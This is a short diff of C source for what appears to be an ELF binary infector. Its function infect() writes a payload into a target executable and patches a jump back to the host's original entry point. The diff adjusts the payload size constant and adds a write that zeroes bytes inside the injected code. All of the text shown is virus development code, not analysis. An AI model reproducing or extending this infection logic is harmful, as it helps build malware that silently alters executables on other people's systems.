@@ -14,7 +14,7 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE	0xb9
+#define _START_SIZE 0xe7
 
 //	Infects the file located at path
 //
@@ -88,8 +88,10 @@ bool	infect(profiling *this, const str path) {
 		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
 	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
+	int zero = 0;
 
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 208, (byte *)&zero, 4);
 
 	// Logic ends
 	infect_end:
